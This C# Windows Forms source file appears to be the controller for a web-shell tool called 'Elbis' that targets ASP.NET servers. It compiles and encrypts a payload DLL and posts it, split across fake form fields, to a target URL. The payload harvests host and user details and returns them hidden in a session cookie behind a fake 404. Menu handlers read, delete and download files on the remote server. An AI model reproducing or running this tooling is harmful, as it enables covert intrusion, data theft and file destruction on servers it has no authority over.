using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.CodeDom.Compiler;
using System.Diagnostics;
using Microsoft.CSharp;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Net.Http;
using System.Net;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.WebControls;
using Elbis.Features.File;
using Elbis.Features;
using static System.Net.Mime.MediaTypeNames;
using System.Data.SqlTypes;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Elbis
{
    public partial class Form1 : Form
    {
        public static string directoryfilepath = "";
        public static string parrentdirectoryfilepath = "";

        FileExplorer fe = new FileExplorer();
        public Form1()
        {
            InitializeComponent();
        }

        private void commandBtn_Click(object sender, EventArgs e)
        {
            string code = @"
			using System;            
            using System;
			using System.IO;
			using System.IO.Compression;
			using System.Text;
			using System.Web;
            using System.Reflection;
            using System.Web.Configuration;
			namespace N
			{
				internal class C
				{
					private static byte[] M()
					{
                        try
                        {              
                            C.result += ""MachineName: "" + Environment.MachineName + ""\n"";
                            C.result += ""OSVersion: "" + Environment.OSVersion + ""\n"";
                            C.result += ""UserName: "" + Environment.UserName + ""\n"";
                            C.result += ""SystemDirectory: "" + Environment.SystemDirectory + ""\n"";
                            C.result += ""GetEnvironmentVariable: "" + Environment.GetEnvironmentVariable(""TEMP"") + ""\n"";
                            C.result += ""UserDomainName: "" + Environment.UserDomainName + ""\n\n"";
                            C.result += ""---------------------------------------------"" + ""\n"";
                            
                        }
                        catch (Exception ex)
                        {
                            C.result = ex.Message;
                        }
						byte[] array3 = new byte[0];
						try
						{
							byte[] bytes = Encoding.UTF8.GetBytes(C.result);
							using (MemoryStream memoryStream = new MemoryStream())
							{
								using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
								{
									gzipStream.Write(bytes, 0, bytes.Length);
								}
								array3 = memoryStream.ToArray();
							}
						}
						catch
						{
						}
						return array3;
					}
                            
  
        public static void AppendToResult(string message)
        {
            C.result += message + Environment.NewLine;
        }
					public override bool Equals(object obj)
					{
						try
						{
							HttpResponse response = HttpContext.Current.Response;
							response.Cookies[""ASP.NET_SessionId""].Value = Convert.ToBase64String(C.M());
							response.StatusCode = 404;
							response.Clear();
						}
						catch
						{
						}
						return true;
					}
					private static string result = """";
				}
			}
			";
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            string randomString = new string(Enumerable.Repeat(chars, 8)
              .Select(s => s[random.Next(s.Length)]).ToArray());
            string filename = "App_Web_" + randomString.ToLower() + ".dll";
            Assembly assembly = Assembly.GetExecutingAssembly();
            string assemblyLocation = assembly.Location;
            string filePath = System.IO.Path.GetDirectoryName(assemblyLocation) + "\\" + filename;
            CompilerParameters parms = new CompilerParameters
            {
                GenerateExecutable = false,
                GenerateInMemory = false,
                IncludeDebugInformation = false,
                OutputAssembly = filePath
            };
            parms.ReferencedAssemblies.Add("System.dll");
            parms.ReferencedAssemblies.Add("System.IO.dll");
            parms.ReferencedAssemblies.Add("System.IO.Compression.dll");
            parms.ReferencedAssemblies.Add("System.Web.dll");
            parms.ReferencedAssemblies.Add("System.Reflection.dll");
            CodeDomProvider compiler = CSharpCodeProvider.CreateProvider("CSharp");
            CompilerResults results = compiler.CompileAssemblyFromSource(parms, code);
            if (results.Errors.HasErrors)
            {
                string errorexp = "";
                foreach (CompilerError error in results.Errors)
                {
                    errorexp += error.ErrorText + Environment.NewLine;
                }
                MessageBox.Show(errorexp);
            }
            byte[] dataToEncrypt = File.ReadAllBytes(filePath);
            byte[] key = new Guid("6979696b-6976-6172-7369-6e206572656e").ToByteArray();
            byte[] encryptedData;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, new RijndaelManaged { Mode = CipherMode.CBC }.CreateEncryptor(key, key), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(dataToEncrypt, 0, dataToEncrypt.Length);
                    cryptoStream.FlushFinalBlock();
                }
                byte[] encryptedBytes = memoryStream.ToArray();
                using (MemoryStream compressedStream = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Compress))
                    {
                        gzipStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                    }
                    encryptedData = compressedStream.ToArray();
                }
            }
            string encryptedDataString = Convert.ToBase64String(encryptedData);
            //encryptedDataString = "ZWxiaXM" + encryptedDataString + "ZWxiaXM";
            int partsCount = 6;
            // Her parça için karakter sayısı
            int partLength = (int)Math.Ceiling((double)encryptedDataString.Length / partsCount);

            // Parçaları ata
            string __NOTIFICATIONID = encryptedDataString.Substring(0, partLength);
            string __CALLBACKPARAMETER = encryptedDataString.Substring(partLength, partLength);
            string __ACTIONARGUMENT = encryptedDataString.Substring(partLength * 2, partLength);
            string __ACTIONTARGET = encryptedDataString.Substring(partLength * 3, partLength);
            string __VALIDATIONRESULT = encryptedDataString.Substring(partLength * 4, partLength);
            string __SECURITYTOKEN = encryptedDataString.Substring(partLength * 5);


            var resut = "__NOTIFICATIONID=" + __NOTIFICATIONID + "&__CALLBACKPARAMETER=" + __CALLBACKPARAMETER + "&__ACTIONARGUMENT=" + __ACTIONARGUMENT + "&__ACTIONTARGET=" + __ACTIONTARGET + "&__VALIDATIONRESULT=" + __VALIDATIONRESULT + "&__SECURITYTOKEN=" + __SECURITYTOKEN;
            string url = elbisURLText.Text;
            StringContent content = new StringContent(resut, Encoding.UTF8, "text/plain");
            using (HttpClient client = new HttpClient())
            {
                // POST isteğini gönder ve cevabı al
                HttpResponseMessage response = client.PostAsync(url, content).Result;

                // İsteğin başarılı olup olmadığını kontrol et
                if (response.StatusCode == HttpStatusCode.NotFound)
                {
                    // Başarılı ise cevap içeriğini oku
                    if (response.Headers.TryGetValues("Set-Cookie", out var cookies))
                    {
                        foreach (var cookie in cookies)
                        {
                            Console.WriteLine("Cookie: " + cookie);
                            if (cookie.Split('=').FirstOrDefault() == "ASP.NET_SessionId")
                            {
                                string responseMessage = cookie.Replace("ASP.NET_SessionId=", "").Split(';').FirstOrDefault();
                                var responseMessageByte = Convert.FromBase64String(responseMessage);
                                byte[] decompressedBytes;
                                using (MemoryStream compressedStream = new MemoryStream(responseMessageByte))
                                {
                                    using (MemoryStream decompressedStream = new MemoryStream())
                                    {
                                        using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                                        {
                                            gzipStream.CopyTo(decompressedStream);
                                        }
                                        decompressedBytes = decompressedStream.ToArray();
                                    }
                                }

                                // Açılmış veriyi kullanma
                                string originalText = System.Text.Encoding.UTF8.GetString(decompressedBytes);
                                directoryListingResponseText.Text = originalText;
                            }
                        }
                    }
                }
                else
                {
                    // Başarısız ise hata kodunu yazdır
                    Console.WriteLine("İstek başarısız. Hata kodu: " + response.StatusCode);
                }
            }
        }
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            MessageBox.Show("test");
        }

        private void tabControl1_Selected(object sender, TabControlEventArgs e)
        {
            if (e.TabPage.Name == "tabPage3")
            {
                directoryfilepath = "";
                directoryListingResponseText.Text = "";
                trwFileExplorer.Nodes.Clear();
                string response = FileOpretions.DriverListing(elbisURLText.Text);
                var test = response.Split(';').ToList();
                fe.CreateTree(this.trwFileExplorer, test);

            }
            else
            {
                directoryfilepath = "";
                parrentdirectoryfilepath = "";
                directoryListingResponseText.Text = "";
            }

        }

        private void trwFileExplorer_AfterExpand(object sender, TreeViewEventArgs e)
        {

            //var response = Listing.DirectoryListing(elbisURLText.Text, e.Node.FullPath).Split(';').ToList();
            //List<string> directoryList = new List<string>();
            //List<string> filesList = new List<string>();
            //foreach (var item in response)
            //{
            //    bool directorycheck = false;
            //    directorycheck = item.Contains("#directoryElbis#");
            //    if (directorycheck && item != "#directoryElbis#")
            //        directoryList.Add(item.Replace("#directoryElbis#", "").Trim());
            //    else
            //    {
            //        bool filescheck = false;
            //        filescheck = item.Contains("#FileNameElbis#");
            //        if (filescheck && item != "#FileNameElbis#")
            //            filesList.Add(item.Replace("#FileNameElbis#", "").Trim());
            //    }
            //}
            //System.Windows.Forms.TreeNode node = fe.EnumerateDirectory(e.Node, directoryList, filesList);
        }

        private void trwFileExplorer_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            var response = FileOpretions.DirectoryListing(elbisURLText.Text, e.Node.FullPath).Split(';').ToList();
            List<string> directoryList = new List<string>();
            List<string> filesList = new List<string>();
            foreach (var item in response)
            {
                bool directorycheck = false;
                directorycheck = item.Contains("#directoryElbis#");
                if (directorycheck && item != "#directoryElbis#")
                    directoryList.Add(item.Replace("#directoryElbis#", "").Trim());
                else
                {
                    bool filescheck = false;
                    filescheck = item.Contains("#FileNameElbis#");
                    if (filescheck && item != "#FileNameElbis#")
                        filesList.Add(item.Replace("#FileNameElbis#", "").Trim());
                }
            }
            System.Windows.Forms.TreeNode node = fe.EnumerateDirectory(e.Node, directoryList, filesList);
        }

        private void trwFileExplorer_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.ImageIndex == 2)
            {
                string originalText = FileOpretions.FileInformation(elbisURLText.Text, e.Node.FullPath);
                directoryfilepath = e.Node.FullPath;
                directoryListingResponseText.Text = originalText;
            }
            else if (e.Node.ImageIndex == 0)
            {
                parrentdirectoryfilepath = e.Node.FullPath;

            }
        }

        private void contextMenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            try
            {
                ToolStripItem clickedItem = e.ClickedItem;
                if (clickedItem.Text == "Read")
                {
                    string originalText = FileOpretions.FileRead(elbisURLText.Text, directoryfilepath);
                    ShowDataForm showDataForm = new ShowDataForm(originalText);
                    showDataForm.ShowDialog();
                }
                else if (clickedItem.Text == "Delete")
                {
                    string originalText = FileOpretions.FileDelete(elbisURLText.Text, directoryfilepath);
                    MessageBox.Show(originalText);
                }
                else if (clickedItem.Text == "Download")
                {
                    List<byte> originalByte = new List<byte>();
                    int chunkNumber = 1;
                    while (true)
                    {
                        string response = FileOpretions.FileDownload(elbisURLText.Text, directoryfilepath, chunkNumber);
                        if (response != "Complate")
                        {
                            originalByte.AddRange(Convert.FromBase64String(response));
                            chunkNumber++;
                        }
                        else
                            break;
                    }
                    SaveFileDialog saveFileDialog = new SaveFileDialog();
                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        File.WriteAllBytes(saveFileDialog.FileName, originalByte.ToArray());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

        }


        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            this.MaximizeBox = false;
        }
    }
}
